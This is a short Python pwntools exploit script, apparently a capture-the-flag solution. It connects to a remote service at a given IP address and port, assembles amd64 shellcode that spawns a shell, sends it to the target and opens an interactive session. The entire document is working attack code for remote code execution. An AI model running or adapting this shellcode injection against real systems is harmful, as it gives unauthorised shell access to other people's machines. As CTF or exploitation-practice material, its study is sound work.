from pwn import *
p=process('./challenge')
p=remote('23.146.248.136', 10023)
context.arch='amd64'
shell=asm(shellcraft.sh())
p.send(shell)
p.interactive()
